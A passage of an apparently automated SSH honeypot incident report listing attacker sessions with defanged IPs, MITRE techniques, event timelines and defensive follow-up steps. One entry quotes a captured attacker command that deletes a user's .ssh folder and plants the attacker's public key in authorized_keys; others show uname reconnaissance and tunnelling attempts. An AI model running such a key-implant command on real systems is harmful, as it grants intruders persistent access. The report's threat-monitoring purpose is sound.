| `2026-07-16 11:27:04` | `cowrie.session.params` |
| `2026-07-16 11:27:04` | `cowrie.command.input` |
| `2026-07-16 11:27:04` | `cowrie.session.file_download` |
| `2026-07-16 11:27:04` | `cowrie.log.closed` |
| `2026-07-16 11:27:07` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `3.28.44[.]14` to AbuseIPDB if not already reported
- [ ] Block `3.28.44[.]14` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Run Tool 31 malware analyzer on captured payload(s)
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-83a68d09bb5a

| Field | Detail |
|---|---|
| **Source IP** | `3.28.44[.]14` |
| **First Seen** | 2026-07-16 11:27 |
| **Last Seen** | 2026-07-16 11:27 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-16 11:27:05` | `cowrie.session.connect` |
| `2026-07-16 11:27:05` | `cowrie.client.version` |
| `2026-07-16 11:27:05` | `cowrie.client.kex` |
| `2026-07-16 11:27:06` | `cowrie.login.success` |
| `2026-07-16 11:27:06` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `3.28.44[.]14` to AbuseIPDB if not already reported
- [ ] Block `3.28.44[.]14` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-792b1fbf5be4

| Field | Detail |
|---|---|
| **Source IP** | `3.28.44[.]14` |
| **First Seen** | 2026-07-16 11:27 |
| **Last Seen** | 2026-07-16 11:27 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-16 11:27:06` | `cowrie.session.connect` |
| `2026-07-16 11:27:06` | `cowrie.client.version` |
| `2026-07-16 11:27:06` | `cowrie.client.kex` |
| `2026-07-16 11:27:07` | `cowrie.login.success` |
| `2026-07-16 11:27:07` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `3.28.44[.]14` to AbuseIPDB if not already reported
- [ ] Block `3.28.44[.]14` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-841db3a7c447

| Field | Detail |
|---|---|
| **Source IP** | `188.219.104[.]210` |
| **First Seen** | 2026-07-16 11:27 |
| **Last Seen** | 2026-07-16 11:27 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-16 11:27:49` | `cowrie.session.connect` |
| `2026-07-16 11:27:50` | `cowrie.client.version` |
| `2026-07-16 11:27:50` | `cowrie.client.kex` |
| `2026-07-16 11:27:51` | `cowrie.login.success` |
| `2026-07-16 11:27:51` | `cowrie.direct-tcpip.request` |
| `2026-07-16 11:27:55` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `188.219.104[.]210` to AbuseIPDB if not already reported
- [ ] Block `188.219.104[.]210` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9084b7ece81c

| Field | Detail |
|---|---|
| **Source IP** | `221.120.4[.]61` |
| **First Seen** | 2026-07-16 11:31 |
| **Last Seen** | 2026-07-16 11:31 |
| **Session Duration** | 10s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-16 11:31:25` | `cowrie.session.connect` |
| `2026-07-16 11:31:28` | `cowrie.client.version` |
| `2026-07-16 11:31:28` | `cowrie.client.kex` |
| `2026-07-16 11:31:31` | `cowrie.login.success` |
| `2026-07-16 11:31:34` | `cowrie.direct-tcpip.request` |
| `2026-07-16 11:31:35` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `221.120.4[.]61` to AbuseIPDB if not already reported
- [ ] Block `221.120.4[.]61` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6a3b95904f43

| Field | Detail |
|---|---|
| **Source IP** | `65.49.1[.]132` |
| **First Seen** | 2026-07-16 11:37 |
| **Last Seen** | 2026-07-16 11:37 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0[.]0 Safari/537.36, Accept: */*, Accept-Encoding: gzip` |
| **TTPs (MITRE)** | T1078 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-16 11:37:12` | `cowrie.session.connect` |
| `2026-07-16 11:37:12` | `cowrie.login.success` |
| `2026-07-16 11:37:13` | `cowrie.session.params` |
| `2026-07-16 11:37:13` | `cowrie.command.input` |
| `2026-07-16 11:37:13` | `cowrie.command.input` |
| `2026-07-16 11:37:13` | `cowrie.command.failed` |
| `2026-07-16 11:37:13` | `cowrie.command.input` |
| `2026-07-16 11:37:13` | `cowrie.command.failed` |
| `2026-07-16 11:37:13` | `cowrie.command.input` |
| `2026-07-16 11:37:13` | `cowrie.log.closed` |
| `2026-07-16 11:37:13` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `65.49.1[.]132` to AbuseIPDB if not already reported
- [ ] Block `65.49.1[.]132` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a595dd54dde8

| Field | Detail |
|---|---|
| **Source IP** | `122.160.142[.]194` |
| **First Seen** | 2026-07-16 11:37 |
| **Last Seen** | 2026-07-16 11:38 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-16 11:37:59` | `cowrie.session.connect` |
| `2026-07-16 11:38:00` | `cowrie.client.version` |
| `2026-07-16 11:38:00` | `cowrie.client.kex` |
| `2026-07-16 11:38:02` | `cowrie.login.success` |
| `2026-07-16 11:38:03` | `cowrie.direct-tcpip.request` |
| `2026-07-16 11:38:08` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `122.160.142[.]194` to AbuseIPDB if not already reported
- [ ] Block `122.160.142[.]194` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-eca5ba1bd7c7

| Field | Detail |
|---|---|
| **Source IP** | `185.242.3[.]195` |
| **First Seen** | 2026-07-16 11:39 |
| **Last Seen** | 2026-07-16 11:39 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo OK` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-16 11:39:40` | `cowrie.session.connect` |
| `2026-07-16 11:39:40` | `cowrie.client.version` |
| `2026-07-16 11:39:40` | `cowrie.client.kex` |
| `2026-07-16 11:39:41` | `cowrie.login.success` |
| `2026-07-16 11:39:41` | `cowrie.session.params` |
| `2026-07-16 11:39:41` | `cowrie.command.input` |
| `2026-07-16 11:39:41` | `cowrie.log.closed` |
| `2026-07-16 11:39:41` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `185.242.3[.]195` to AbuseIPDB if not already reported
- [ ] Block `185.242.3[.]195` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-12f1e627bf6c

| Field | Detail |
|---|---|
| **Source IP** | `115.190.128[.]221` |
| **First Seen** | 2026-07-16 11:40 |
| **Last Seen** | 2026-07-16 11:45 |
| **Session Duration** | 302s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-16 11:40:45` | `cowrie.session.connect` |
| `2026-07-16 11:40:45` | `cowrie.client.version` |
| `2026-07-16 11:40:46` | `cowrie.client.kex` |
| `2026-07-16 11:40:47` | `cowrie.login.success` |
| `2026-07-16 11:40:49` | `cowrie.session.params` |
| `2026-07-16 11:40:49` | `cowrie.command.input` |
| `2026-07-16 11:40:49` | `cowrie.command.failed` |
| `2026-07-16 11:40:50` | `cowrie.log.closed` |
| `2026-07-16 11:40:51` | `cowrie.session.params` |
| `2026-07-16 11:40:51` | `cowrie.command.input` |
| `2026-07-16 11:40:53` | `cowrie.session.file_download` |
| `2026-07-16 11:40:53` | `cowrie.log.closed` |
| `2026-07-16 11:45:47` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `115.190.128[.]221` to AbuseIPDB if not already reported
- [ ] Block `115.190.128[.]221` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Run Tool 31 malware analyzer on captured payload(s)
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0db64fc25c1d

| Field | Detail |
|---|---|
| **Source IP** | `103.61.122[.]229` |
| **First Seen** | 2026-07-16 11:44 |
| **Last Seen** | 2026-07-16 11:44 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-16 11:44:28` | `cowrie.session.connect` |
| `2026-07-16 11:44:28` | `cowrie.client.version` |
| `2026-07-16 11:44:28` | `cowrie.client.kex` |
| `2026-07-16 11:44:29` | `cowrie.login.success` |
| `2026-07-16 11:44:29` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.61.122[.]229` to AbuseIPDB if not already reported
- [ ] Block `103.61.122[.]229` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-609e889a377a

| Field | Detail |
|---|---|
| **Source IP** | `2.57.122[.]238` |
| **First Seen** | 2026-07-16 11:45 |
| **Last Seen** | 2026-07-16 11:45 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-16 11:45:56` | `cowrie.session.connect` |
| `2026-07-16 11:45:56` | `cowrie.client.version` |
| `2026-07-16 11:45:56` | `cowrie.client.kex` |
| `2026-07-16 11:45:56` | `cowrie.login.success` |
| `2026-07-16 11:45:57` | `cowrie.session.params` |
| `2026-07-16 11:45:57` | `cowrie.command.input` |
| `2026-07-16 11:45:57` | `cowrie.log.closed` |
| `2026-07-16 11:45:57` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `2.57.122[.]238` to AbuseIPDB if not already reported
- [ ] Block `2.57.122[.]238` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-61703b2976db

| Field | Detail |
|---|---|
| **Source IP** | `2.57.122[.]238` |
| **First Seen** | 2026-07-16 11:47 |
| **Last Seen** | 2026-07-16 11:47 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-16 11:47:39` | `cowrie.session.connect` |
| `2026-07-16 11:47:39` | `cowrie.client.version` |
| `2026-07-16 11:47:39` | `cowrie.client.kex` |
| `2026-07-16 11:47:39` | `cowrie.login.success` |
| `2026-07-16 11:47:40` | `cowrie.session.params` |
| `2026-07-16 11:47:40` | `cowrie.command.input` |
| `2026-07-16 11:47:40` | `cowrie.log.closed` |
| `2026-07-16 11:47:40` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `2.57.122[.]238` to AbuseIPDB if not already reported
- [ ] Block `2.57.122[.]238` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a3c9c5cf8ed4

| Field | Detail |
|---|---|
| **Source IP** | `2.57.122[.]238` |
| **First Seen** | 2026-07-16 11:49 |
| **Last Seen** | 2026-07-16 11:49 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-16 11:49:20` | `cowrie.session.connect` |
| `2026-07-16 11:49:20` | `cowrie.client.version` |
| `2026-07-16 11:49:21` | `cowrie.client.kex` |
| `2026-07-16 11:49:21` | `cowrie.login.success` |
| `2026-07-16 11:49:22` | `cowrie.session.params` |
| `2026-07-16 11:49:22` | `cowrie.command.input` |
| `2026-07-16 11:49:22` | `cowrie.log.closed` |
| `2026-07-16 11:49:22` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `2.57.122[.]238` to AbuseIPDB if not already reported
- [ ] Block `2.57.122[.]238` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9be246a79323

| Field | Detail |
|---|---|
| **Source IP** | `220.128.137[.]164` |
| **First Seen** | 2026-07-16 11:50 |
| **Last Seen** | 2026-07-16 11:50 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-16 11:50:24` | `cowrie.session.connect` |
| `2026-07-16 11:50:25` | `cowrie.client.version` |
| `2026-07-16 11:50:25` | `cowrie.client.kex` |
| `2026-07-16 11:50:27` | `cowrie.login.success` |
| `2026-07-16 11:50:27` | `cowrie.direct-tcpip.request` |
| `2026-07-16 11:50:32` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `220.128.137[.]164` to AbuseIPDB if not already reported
- [ ] Block `220.128.137[.]164` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f2d53139b580

| Field | Detail |
|---|---|
| **Source IP** | `113.108.88[.]121` |
| **First Seen** | 2026-07-16 11:50 |
| **Last Seen** | 2026-07-16 11:50 |
| **Session Duration** | 15s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-16 11:50:33` | `cowrie.session.connect` |
| `2026-07-16 11:50:34` | `cowrie.client.version` |
| `2026-07-16 11:50:34` | `cowrie.client.kex` |
| `2026-07-16 11:50:41` | `cowrie.login.success` |
| `2026-07-16 11:50:42` | `cowrie.direct-tcpip.request` |
| `2026-07-16 11:50:48` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `113.108.88[.]121` to AbuseIPDB if not already reported
- [ ] Block `113.108.88[.]121` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f03325d06274

| Field | Detail |
|---|---|
| **Source IP** | `2.57.122[.]238` |
| **First Seen** | 2026-07-16 11:50 |
| **Last Seen** | 2026-07-16 11:50 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-16 11:50:56` | `cowrie.session.connect` |
| `2026-07-16 11:50:56` | `cowrie.client.version` |
| `2026-07-16 11:50:56` | `cowrie.client.kex` |
| `2026-07-16 11:50:57` | `cowrie.login.success` |
| `2026-07-16 11:50:57` | `cowrie.session.params` |
| `2026-07-16 11:50:57` | `cowrie.command.input` |
| `2026-07-16 11:50:58` | `cowrie.log.closed` |
| `2026-07-16 11:50:58` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `2.57.122[.]238` to AbuseIPDB if not already reported
- [ ] Block `2.57.122[.]238` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-35de90c98115

| Field | Detail |
|---|---|
| **Source IP** | `2.57.122[.]238` |
| **First Seen** | 2026-07-16 11:52 |
| **Last Seen** | 2026-07-16 11:52 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-16 11:52:26` | `cowrie.session.connect` |
| `2026-07-16 11:52:26` | `cowrie.client.version` |
| `2026-07-16 11:52:26` | `cowrie.client.kex` |
| `2026-07-16 11:52:27` | `cowrie.login.success` |
| `2026-07-16 11:52:27` | `cowrie.session.params` |
| `2026-07-16 11:52:27` | `cowrie.command.input` |
| `2026-07-16 11:52:28` | `cowrie.log.closed` |
| `2026-07-16 11:52:28` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `2.57.122[.]238` to AbuseIPDB if not already reported
- [ ] Block `2.57.122[.]238` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4736429d0f8a

| Field | Detail |
|---|---|
| **Source IP** | `188.226.132[.]113` |
| **First Seen** | 2026-07-16 11:52 |
| **Last Seen** | 2026-07-16 11:52 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-16 11:52:43` | `cowrie.session.connect` |
| `2026-07-16 11:52:44` | `cowrie.client.version` |
| `2026-07-16 11:52:44` | `cowrie.client.kex` |
| `2026-07-16 11:52:44` | `cowrie.login.success` |
| `2026-07-16 11:52:45` | `cowrie.direct-tcpip.request` |
| `2026-07-16 11:52:49` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `188.226.132[.]113` to AbuseIPDB if not already reported
- [ ] Block `188.226.132[.]113` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-208a53f9b677

| Field | Detail |
|---|---|
| **Source IP** | `2.57.122[.]238` |
| **First Seen** | 2026-07-16 11:54 |
| **Last Seen** | 2026-07-16 11:54 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-16 11:54:00` | `cowrie.session.connect` |
| `2026-07-16 11:54:00` | `cowrie.client.version` |
| `2026-07-16 11:54:00` | `cowrie.client.kex` |
| `2026-07-16 11:54:00` | `cowrie.login.success` |
| `2026-07-16 11:54:01` | `cowrie.session.params` |
| `2026-07-16 11:54:01` | `cowrie.command.input` |
| `2026-07-16 11:54:01` | `cowrie.log.closed` |
| `2026-07-16 11:54:01` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `2.57.122[.]238` to AbuseIPDB if not already reported
- [ ] Block `2.57.122[.]238` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-cb41888825a1

| Field | Detail |
|---|---|
| **Source IP** | `2.57.122[.]238` |
| **First Seen** | 2026-07-16 11:55 |
| **Last Seen** | 2026-07-16 11:55 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-16 11:55:35` | `cowrie.session.connect` |
| `2026-07-16 11:55:35` | `cowrie.client.version` |
| `2026-07-16 11:55:35` | `cowrie.client.kex` |
| `2026-07-16 11:55:35` | `cowrie.login.success` |
| `2026-07-16 11:55:36` | `cowrie.session.params` |
| `2026-07-16 11:55:36` | `cowrie.command.input` |
| `2026-07-16 11:55:36` | `cowrie.log.closed` |
| `2026-07-16 11:55:36` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `2.57.122[.]238` to AbuseIPDB if not already reported
- [ ] Block `2.57.122[.]238` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9e6602830339

| Field | Detail |
|---|---|
| **Source IP** | `2.57.122[.]238` |
| **First Seen** | 2026-07-16 11:57 |
| **Last Seen** | 2026-07-16 11:57 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-16 11:57:06` | `cowrie.session.connect` |
| `2026-07-16 11:57:06` | `cowrie.client.version` |
| `2026-07-16 11:57:06` | `cowrie.client.kex` |
| `2026-07-16 11:57:06` | `cowrie.login.success` |
| `2026-07-16 11:57:07` | `cowrie.session.params` |
| `2026-07-16 11:57:07` | `cowrie.command.input` |
| `2026-07-16 11:57:07` | `cowrie.log.closed` |
| `2026-07-16 11:57:07` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `2.57.122[.]238` to AbuseIPDB if not already reported
- [ ] Block `2.57.122[.]238` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2c5dc8d74006

| Field | Detail |
|---|---|
| **Source IP** | `2.57.122[.]238` |
| **First Seen** | 2026-07-16 11:58 |
| **Last Seen** | 2026-07-16 11:58 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-16 11:58:39` | `cowrie.session.connect` |
| `2026-07-16 11:58:39` | `cowrie.client.version` |
| `2026-07-16 11:58:40` | `cowrie.client.kex` |
| `2026-07-16 11:58:40` | `cowrie.login.success` |
| `2026-07-16 11:58:41` | `cowrie.session.params` |
| `2026-07-16 11:58:41` | `cowrie.command.input` |
| `2026-07-16 11:58:41` | `cowrie.log.closed` |
| `2026-07-16 11:58:41` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `2.57.122[.]238` to AbuseIPDB if not already reported
- [ ] Block `2.57.122[.]238` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-db6ded7f26c8

| Field | Detail |
|---|---|
| **Source IP** | `2.57.122[.]238` |
| **First Seen** | 2026-07-16 12:00 |
| **Last Seen** | 2026-07-16 12:00 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-16 12:00:16` | `cowrie.session.connect` |
| `2026-07-16 12:00:16` | `cowrie.client.version` |
| `2026-07-16 12:00:16` | `cowrie.client.kex` |
| `2026-07-16 12:00:16` | `cowrie.login.success` |
| `2026-07-16 12:00:17` | `cowrie.session.params` |
| `2026-07-16 12:00:17` | `cowrie.command.input` |
| `2026-07-16 12:00:17` | `cowrie.log.closed` |
| `2026-07-16 12:00:17` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `2.57.122[.]238` to AbuseIPDB if not already reported
- [ ] Block `2.57.122[.]238` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c31396d7621b

| Field | Detail |
|---|---|
| **Source IP** | `2.57.122[.]238` |
| **First Seen** | 2026-07-16 12:01 |
| **Last Seen** | 2026-07-16 12:01 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-16 12:01:58` | `cowrie.session.connect` |
| `2026-07-16 12:01:58` | `cowrie.client.version` |
| `2026-07-16 12:01:58` | `cowrie.client.kex` |
| `2026-07-16 12:01:58` | `cowrie.login.success` |
| `2026-07-16 12:01:59` | `cowrie.session.params` |
| `2026-07-16 12:01:59` | `cowrie.command.input` |
| `2026-07-16 12:01:59` | `cowrie.log.closed` |
| `2026-07-16 12:01:59` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `2.57.122[.]238` to AbuseIPDB if not already reported
- [ ] Block `2.57.122[.]238` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7688abc2c53e

| Field | Detail |
|---|---|
| **Source IP** | `129.153.145[.]135` |
| **First Seen** | 2026-07-16 12:02 |
| **Last Seen** | 2026-07-16 12:02 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-16 12:02:53` | `cowrie.session.connect` |
| `2026-07-16 12:02:53` | `cowrie.client.version` |
| `2026-07-16 12:02:53` | `cowrie.client.kex` |
| `2026-07-16 12:02:53` | `cowrie.login.success` |
| `2026-07-16 12:02:53` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `129.153.145[.]135` to AbuseIPDB if not already reported
- [ ] Block `129.153.145[.]135` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b388020a6f6d

| Field | Detail |
|---|---|
| **Source IP** | `129.153.145[.]135` |
| **First Seen** | 2026-07-16 12:02 |
| **Last Seen** | 2026-07-16 12:02 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-16 12:02:54` | `cowrie.session.connect` |
